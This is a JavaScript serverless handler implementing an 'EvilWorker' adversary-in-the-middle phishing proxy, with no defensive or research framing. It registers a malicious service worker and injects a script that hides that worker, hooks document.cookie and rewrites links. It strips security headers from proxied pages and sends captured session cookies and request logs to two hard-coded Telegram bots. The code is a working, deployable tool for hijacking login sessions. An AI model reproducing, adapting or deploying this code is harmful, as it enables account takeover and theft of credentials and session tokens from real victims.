/**
 * Real EvilWorker Implementation for Vercel
 * Based on the actual EvilWorker proxy_server.js architecture
 */

import crypto from 'crypto';

// EvilWorker Configuration (same as original)
const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
const PHISHED_URL_PARAMETER = "redirect_urI";
const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN_1 = "7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps";
const TELEGRAM_CHAT_ID_1 = "6743632244";
const TELEGRAM_BOT_TOKEN_2 = "7942871168:AAFuvCQXQJhYKipqGpr1G4IhUDABTGWF_9U";
const TELEGRAM_CHAT_ID_2 = "6263177378";

// EvilWorker Paths (same as original)
const PROXY_PATHNAMES = {
    proxy: "/lNv1pC9AWPUY4gbidyBO",
    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js",
    script: "/@",
    mutation: "/Mutation_o5y3f4O7jMGW",
    jsCookie: "/JSCookie_6X7dRqLg90mH",
    favicon: "/favicon.ico"
};

// Session management (in production, use Redis)
const VICTIM_SESSIONS = {};

// Encryption key (same as EvilWorker)
const ENCRYPTION_KEY = "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";

// Main handler
export default async function handler(req, res) {
  const { method, url, headers } = req;
  const incomingUrl = new URL(req.url, `https://${req.headers.host}`);
    const currentSession = getUserSession(headers.cookie);

    try {
        // Handle service worker registration (entry point)
    if (incomingUrl.pathname === '/' && incomingUrl.search.includes(PHISHED_URL_PARAMETER)) {
      return handleServiceWorkerRegistration(req, res);
    }
    
    // Handle service worker file
    if (incomingUrl.pathname === PROXY_PATHNAMES.serviceWorker) {
      return handleServiceWorkerFile(req, res);
    }
        
        // Handle cookie capture
        if (incomingUrl.pathname === PROXY_PATHNAMES.jsCookie) {
            return handleCookieCapture(req, res, currentSession);
        }
        
        // Handle script injection
        if (incomingUrl.pathname === PROXY_PATHNAMES.script) {
            return handleScriptInjection(req, res);
        }
        
        // Handle mutation (cross-origin navigation)
        if (incomingUrl.pathname === PROXY_PATHNAMES.mutation) {
            return handleMutation(req, res, currentSession);
        }
    
    // Handle proxy requests from service worker
    if (incomingUrl.pathname === PROXY_PATHNAMES.proxy) {
            return handleProxyRequest(req, res, currentSession);
    }
    
    // Handle favicon
    if (incomingUrl.pathname === PROXY_PATHNAMES.favicon) {
      return res.status(404).end();
    }
    
        // Default: redirect to legitimate service
        return handleDefaultRedirect(req, res);
    
  } catch (err) {
        console.error('EvilWorker error:', err);
    res.status(503).json({ error: 'Service temporarily unavailable' });
  }
}

// Handle service worker registration (entry point)
function handleServiceWorkerRegistration(req, res) {
  const incomingUrl = new URL(req.url, `https://${req.headers.host}`);
  const phishedURL = decodeURIComponent(incomingUrl.searchParams.get(PHISHED_URL_PARAMETER) || '');
  
  if (!phishedURL) {
    return res.status(400).json({ error: 'Invalid URL parameter' });
  }
  
    // Create new session
    const { cookieName, cookieValue } = generateNewSession(phishedURL);
    
    // Set session cookie
    res.setHeader('Set-Cookie', `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
    
    // Serve the landing page that registers service worker
  const html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
</head>
<body>
    <script>
        if ("serviceWorker" in navigator) {
            navigator.serviceWorker.register("${PROXY_PATHNAMES.serviceWorker}", {
                scope: "/",
            })
            .then((registration) => {
                const phishedParameterURL = new URL(self.location.href).searchParams.get("redirect_urI");
                const phishedURL = new URL(decodeURIComponent(phishedParameterURL));
                
                // Redirect to legitimate service path (this is the key!)
                self.location.replace(phishedURL.href);
            })
            .catch((error) => {
                console.error("Service worker registration failed:", error);
            });
        } else {
            console.error("Service workers are not supported by this browser");
        }
    </script>
</body>
</html>`;

  res.setHeader('Content-Type', 'text/html');
  res.status(200).send(html);
}

// Handle service worker file
function handleServiceWorkerFile(req, res) {
  const serviceWorkerCode = `
self.addEventListener("fetch", (event) => {
    event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
    const proxyRequestURL = "\${self.location.origin}${PROXY_PATHNAMES.proxy}";

    try {
        const proxyRequest = {
            url: request.url,
            method: request.method,
            headers: Object.fromEntries(request.headers.entries()),
            body: await request.text(),
            referrer: request.referrer,
            mode: request.mode
        };
        
        return fetch(proxyRequestURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify(proxyRequest),
            redirect: "manual",
            mode: "same-origin"
        });
    }
    catch (error) {
        console.error("Fetching \${proxyRequestURL} failed:", error);
    }
}`;

  res.setHeader('Content-Type', 'application/javascript');
  res.status(200).send(serviceWorkerCode);
}

// Handle cookie capture
async function handleCookieCapture(req, res, currentSession) {
    if (req.method !== 'POST') {
        return res.status(405).end();
    }

    try {
        const cookieData = await readRawBody(req);
        
        if (!currentSession) {
            return res.status(400).json({ error: 'No active session' });
        }

        // Update session cookies
        updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [cookieData], req.headers.host, currentSession);
        
        // Get valid domains for cookie modification
        const validDomains = getValidDomains([req.headers.host, VICTIM_SESSIONS[currentSession].hostname]);
        
        // Log captured cookie to Telegram
        const telegramMessage = `🍪 <b>COOKIE CAPTURED</b>

🔗 <b>Session:</b> ${currentSession}
🍪 <b>Cookie:</b> <code>${cookieData}</code>
🌐 <b>Host:</b> ${req.headers.host}
⏰ <b>Time:</b> ${new Date().toISOString()}
📱 <b>Platform:</b> EvilWorker AiTM Framework`;

        await sendTelegramNotification(telegramMessage);
        
        res.status(200).json(validDomains);
        
    } catch (error) {
        console.error('Cookie capture error:', error);
        res.status(500).json({ error: 'Cookie capture failed' });
    }
}

// Handle script injection
function handleScriptInjection(req, res) {
    const scriptCode = `
(function () {
    const originalServiceWorkerGetRegistrationDescriptor = navigator.serviceWorker.getRegistration;

    navigator.serviceWorker.getRegistration = function (_scope) {
        return originalServiceWorkerGetRegistrationDescriptor.apply(this, arguments)
            .then(registration => {
                if (registration &&
                    registration.active &&
                    registration.active.scriptURL &&
                    registration.active.scriptURL.endsWith("service_worker_Mz8XO2ny1Pg5.js")) {
                    return undefined;
                }
                return registration;
            });
    };
})();

(function () {
    const originalCookieDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, "cookie");

    Object.defineProperty(document, "cookie", {
        ...originalCookieDescriptor,
        get() {
            return originalCookieDescriptor.get.call(document);
        },
        set(cookie) {
            const proxyRequestURL = "\${self.location.origin}${PROXY_PATHNAMES.jsCookie}";
            try {
                const xhr = new XMLHttpRequest();
                xhr.open("POST", proxyRequestURL, false);
                xhr.setRequestHeader("Content-Type", "text/plain");
                xhr.send(cookie);

                const validDomains = JSON.parse(xhr.responseText);
                let modifiedCookie = "";

                const cookieAttributes = cookie.split(";");
                for (const cookieAttribute of cookieAttributes) {
                    let attribute = cookieAttribute.trim();
                    if (attribute) {
                        const cookieDomainMatch = attribute.match(/^DOMAIN\\s*=(.*)$/i);
                        if (cookieDomainMatch) {
                            const cookieDomain = cookieDomainMatch[1].replace(/^\\./, "").trim();
                            if (cookieDomain && validDomains.includes(cookieDomain)) {
                                attribute = \`Domain=\${self.location.hostname}\`;
                            }
                        }
                        modifiedCookie += \`\${attribute}; \`;
                    }
                }
                originalCookieDescriptor.set.call(document, modifiedCookie.trim());
            }
            catch (error) {
                console.error(\`Fetching \${proxyRequestURL} failed: \${error}\`);
            }
        }
    });
})();

const observer = new MutationObserver((mutations) => {
    for (const mutation of mutations) {
        if (mutation.type === "attributes") {
            updateHTMLAttribute(mutation.target, mutation.attributeName);
        }
        else if (mutation.type === "childList") {
            for (const node of mutation.addedNodes) {
                for (const attribute of attributes) {
                    if (node[attribute]) {
                        updateHTMLAttribute(node, attribute);
                    }
                }
            }
        }
    }
});

const attributes = ["href", "action"];
observer.observe(document.documentElement, {
    childList: true,
    subtree: true,
    attributeFilter: attributes
});

function updateHTMLAttribute(htmlNode, htmlAttribute) {
    try {
        const htmlAttributeURL = new URL(htmlNode[htmlAttribute]);
        if (htmlAttributeURL.origin !== self.location.origin) {
            const proxyRequestURL = new URL(\`\${self.location.origin}${PROXY_PATHNAMES.mutation}\`);
            proxyRequestURL.searchParams.append("redirect_urI", encodeURIComponent(htmlAttributeURL.href));
            htmlNode[htmlAttribute] = proxyRequestURL;
        }
    } catch { }
}`;

    res.setHeader('Content-Type', 'application/javascript');
    res.status(200).send(scriptCode);
}

// Handle mutation (cross-origin navigation)
function handleMutation(req, res, currentSession) {
    const incomingUrl = new URL(req.url, `https://${req.headers.host}`);
    const phishedURL = incomingUrl.searchParams.get(PHISHED_URL_PARAMETER);
    
    if (!phishedURL) {
        return res.status(400).json({ error: 'Invalid mutation URL' });
    }
    
    // Update session with new target
    if (currentSession && VICTIM_SESSIONS[currentSession]) {
        try {
            const targetURL = new URL(decodeURIComponent(phishedURL));
            VICTIM_SESSIONS[currentSession].protocol = targetURL.protocol;
            VICTIM_SESSIONS[currentSession].hostname = targetURL.hostname;
            VICTIM_SESSIONS[currentSession].path = targetURL.pathname + targetURL.search;
            VICTIM_SESSIONS[currentSession].port = targetURL.port;
            VICTIM_SESSIONS[currentSession].host = targetURL.host;
        } catch (error) {
            console.error('Mutation URL parsing error:', error);
        }
    }
    
    res.status(200).json({ success: 'Mutation handled' });
}

// Handle proxy requests from service worker
async function handleProxyRequest(req, res, currentSession) {
  if (req.method !== 'POST') {
    return res.status(405).end();
  }
  
  try {
    const proxyRequest = JSON.parse(await readRawBody(req));
        
        if (!currentSession) {
            return res.status(400).json({ error: 'No active session' });
        }

        const session = VICTIM_SESSIONS[currentSession];
        if (!session) {
            return res.status(400).json({ error: 'Invalid session' });
        }

        // Parse the target URL
    const targetURL = new URL(proxyRequest.url);
    
        // Prepare proxy request options
        const proxyOptions = {
            hostname: targetURL.hostname,
            port: targetURL.port || (targetURL.protocol === 'https:' ? 443 : 80),
            path: targetURL.pathname + targetURL.search,
            method: proxyRequest.method,
            headers: {
                ...proxyRequest.headers,
                'host': targetURL.host
            }
        };
    
    // Remove problematic headers
        delete proxyOptions.headers['content-length'];
        delete proxyOptions.headers['host'];

        // Make the proxy request
        const proxyResponse = await makeProxyRequest(targetURL.protocol, proxyOptions, proxyRequest.body);
        
        // Process and modify the response
        const modifiedResponse = await processProxyResponse(proxyResponse, req.headers.host);
        
        // Set response headers
        Object.entries(modifiedResponse.headers).forEach(([key, value]) => {
            res.setHeader(key, value);
        });
        
        // Send modified response
        res.status(modifiedResponse.status).send(modifiedResponse.body);
        
        // Log the interaction
        await logInteraction(proxyRequest, modifiedResponse, currentSession);
        
    } catch (error) {
        console.error('Proxy request error:', error);
        res.status(500).json({ error: 'Proxy request failed' });
    }
}

// Make proxy request to legitimate service
function makeProxyRequest(protocol, options, body) {
    return new Promise((resolve, reject) => {
        const httpModule = protocol === 'https:' ? require('https') : require('http');
        
        const req = httpModule.request(options, (res) => {
            let data = [];
            res.on('data', chunk => data.push(chunk));
            res.on('end', () => {
                resolve({
                    status: res.statusCode,
                    headers: res.headers,
                    body: Buffer.concat(data)
                });
            });
        });
        
        req.on('error', reject);
        
        if (body) {
            req.write(body);
        }
        
        req.end();
    });
}

// Process proxy response (modify content, inject scripts)
async function processProxyResponse(proxyResponse, proxyHost) {
    let modifiedBody = proxyResponse.body;
    let modifiedHeaders = { ...proxyResponse.headers };
    
    // Check if it's HTML content
    const contentType = proxyResponse.headers['content-type'] || '';
    if (contentType.includes('text/html')) {
        const htmlContent = modifiedBody.toString();
        
        // Inject our malicious script
        const scriptTag = `<script src="/@"></script>`;
        const modifiedHtml = htmlContent.replace('<head>', `<head>${scriptTag}`);
        
        modifiedBody = Buffer.from(modifiedHtml);
        modifiedHeaders['content-length'] = modifiedBody.length.toString();
    }
    
    // Remove security headers that might block our script
    delete modifiedHeaders['x-frame-options'];
    delete modifiedHeaders['content-security-policy'];
    delete modifiedHeaders['x-content-type-options'];
    
    return {
        status: proxyResponse.status,
        headers: modifiedHeaders,
        body: modifiedBody
    };
}

// Handle default redirect
function handleDefaultRedirect(req, res) {
    res.redirect(301, 'https://www.microsoft.com');
}

// Helper functions
function getUserSession(cookieHeader) {
    if (!cookieHeader) return null;
    
    const cookies = cookieHeader.split(';').reduce((acc, cookie) => {
        const [key, value] = cookie.trim().split('=');
        acc[key] = value;
        return acc;
    }, {});
    
    return cookies['evilworker_session'] || null;
}

function generateNewSession(phishedURL) {
    const sessionId = crypto.randomBytes(16).toString('hex');
    const cookieName = 'evilworker_session';
    const cookieValue = sessionId;
    
    VICTIM_SESSIONS[sessionId] = {
        value: cookieValue,
        cookies: [],
        logFilename: `${phishedURL.hostname}__${Date.now()}`,
        protocol: phishedURL.protocol,
        hostname: phishedURL.hostname,
        path: phishedURL.pathname + phishedURL.search,
        port: phishedURL.port,
        host: phishedURL.host,
        createdAt: new Date().toISOString()
    };
    
    return { cookieName, cookieValue };
}

function updateCurrentSessionCookies(session, cookies, proxyHost, sessionId) {
    for (const cookie of cookies) {
        const parsedCookie = parseCookie(cookie);
        if (parsedCookie) {
            session.cookies.push(parsedCookie);
        }
    }
}

function parseCookie(cookieString) {
    try {
        const [nameValue, ...attributes] = cookieString.split(';');
        const [name, value] = nameValue.split('=');
        
        const cookie = { name: name.trim(), value: value.trim() };
        
        for (const attribute of attributes) {
            const [attrName, attrValue] = attribute.trim().split('=');
            const lowerAttrName = attrName.toLowerCase();
            
            if (lowerAttrName === 'domain') {
                cookie.domain = attrValue;
            } else if (lowerAttrName === 'path') {
                cookie.path = attrValue;
            } else if (lowerAttrName === 'expires') {
                cookie.expires = new Date(attrValue).getTime();
            } else if (lowerAttrName === 'max-age') {
                cookie.expires = Date.now() + (parseInt(attrValue) * 1000);
            } else if (lowerAttrName === 'secure') {
                cookie.secure = true;
            } else if (lowerAttrName === 'httponly') {
                cookie.httpOnly = true;
            } else if (lowerAttrName === 'samesite') {
                cookie.sameSite = attrValue;
            }
        }
        
        return cookie;
    } catch (error) {
        console.error('Cookie parsing error:', error);
        return null;
    }
}

function getValidDomains(domains) {
    return domains.filter(domain => domain && domain !== 'localhost');
}

async function logInteraction(proxyRequest, proxyResponse, sessionId) {
  try {
    const logData = {
      timestamp: new Date().toISOString(),
            sessionId: sessionId,
            proxyRequestURL: proxyRequest.url,
            proxyRequestMethod: proxyRequest.method,
            proxyRequestHeaders: proxyRequest.headers,
            proxyRequestBody: proxyRequest.body,
            proxyResponseStatusCode: proxyResponse.status,
            proxyResponseHeaders: proxyResponse.headers
    };
    
    // Encrypt the log data
        const encryptedData = encryptData(JSON.stringify(logData));
        
        // Send to Telegram
        const telegramMessage = `📡 <b>REQUEST LOGGED</b>

🔗 <b>URL:</b> ${proxyRequest.url}
📝 <b>Method:</b> ${proxyRequest.method}
🌐 <b>Session:</b> ${sessionId}
⏰ <b>Time:</b> ${logData.timestamp}
📊 <b>Status:</b> ${proxyResponse.status}`;

        await sendTelegramNotification(telegramMessage);
        
        console.log('ENCRYPTED_LOG:', encryptedData);
        
  } catch (error) {
    console.error('Logging error:', error);
  }
}

function encryptData(data) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-ctr', ENCRYPTION_KEY, iv);
    
    let encrypted = cipher.update(data, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    
    return JSON.stringify({
        [iv.toString('hex')]: encrypted
    });
}

async function sendTelegramNotification(message) {
    try {
        // Send to both bots
        const bots = [
            { token: TELEGRAM_BOT_TOKEN_1, chatId: TELEGRAM_CHAT_ID_1 },
            { token: TELEGRAM_BOT_TOKEN_2, chatId: TELEGRAM_CHAT_ID_2 }
        ];
        
        for (const bot of bots) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: bot.chatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                if (!response.ok) {
                    console.error(`Telegram notification failed for bot: ${response.status}`);
                }
            } catch (error) {
                console.error(`Telegram notification error for bot:`, error);
            }
        }
    } catch (error) {
        console.error('Telegram notification error:', error);
    }
}

function readRawBody(req) {
  return new Promise((resolve, reject) => {
    const chunks = [];
        req.on('data', (chunk) => chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk)));
    req.on('end', () => resolve(Buffer.concat(chunks).toString()));
    req.on('error', reject);
  });
}
